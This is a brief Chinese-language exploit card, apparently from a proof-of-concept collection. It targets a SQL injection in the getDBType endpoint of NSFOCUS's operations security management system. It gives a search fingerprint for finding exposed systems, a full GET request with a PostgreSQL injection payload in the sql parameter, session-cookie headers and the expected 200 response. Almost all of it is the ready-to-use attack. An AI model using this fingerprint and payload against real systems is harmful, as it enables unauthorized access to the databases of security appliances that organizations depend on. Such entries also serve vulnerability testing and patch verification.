# 绿盟运维安全管理系统getDBType存在SQL注入漏洞

- **系统**：绿盟运维安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="'/needUsbkey.php?username='"`
- **请求**：`GET /webconf/log/getDBType?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&sql=(SELECT+(CHR(113)%7C%7CCHR(122)%7C%7CCHR(122)%7C%7CCHR(107)%7C%7CCHR(113))%7C%7C(SELECT+(CASE+WHEN+(3788%3D3788)+THEN+1+ELSE+0+END))%3A%3Atext%7C%7C(CHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113))) HTTP/1.`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Cookie: PHPSESSID=fdb9910a4479d9a6d7eeff579f4f2f69; PHPSESSID_NS_Sig=oenCV6ibz2py61Oz`
- **预期**：200　|　—